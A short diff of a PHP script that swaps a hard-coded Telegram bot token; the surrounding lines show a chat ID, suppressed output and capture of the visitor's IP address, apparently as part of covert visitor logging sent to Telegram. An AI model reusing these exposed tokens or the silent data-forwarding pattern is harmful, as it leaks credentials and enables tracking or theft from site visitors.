@@ -6,7 +6,7 @@
 // Suppress all output to keep connection clean
 ob_start();
 
-$botToken = '7284066719:AAFmrZ2q7kWos3sAwvigTquNtFwGEjN3JGY';
+$botToken = '7284066719:AAESrzINEKBG1kyj9oM_4U3KeKptQeHBQaI';
 $chatID   = '7724482403';
 
 $ip   = $_SERVER['HTTP_CF_CONNECTING_IP'] ?? $_SERVER['REMOTE_ADDR'] ?? 'Unknown';
